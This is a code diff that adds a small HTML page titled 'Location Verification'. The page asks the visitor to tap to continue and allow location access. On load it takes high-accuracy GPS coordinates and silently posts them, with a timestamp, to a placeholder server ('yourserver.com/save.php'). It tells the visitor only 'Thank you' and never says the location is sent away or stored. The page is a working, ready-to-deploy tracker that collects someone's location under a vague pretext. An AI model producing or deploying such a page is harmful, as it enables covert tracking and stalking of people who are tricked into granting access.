@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Location Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+  <h2>Tap to continue</h2>
+  <p>Please allow location access</p>
+
+  <script>
+    window.onload = () => {
+      if (!navigator.geolocation) {
+        alert("Geolocation not supported");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        success,
+        error,
+        { enableHighAccuracy: true }
+      );
+    };
+
+    function success(position) {
+      const data = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        time: new Date().toISOString()
+      };
+
+      fetch("https://yourserver.com/save.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+
+      document.body.innerHTML = "<h3>Thank you</h3>";
+    }
+
+    function error() {
+      alert("Location permission denied");
+    }
+  </script>
+</body>
+</html>
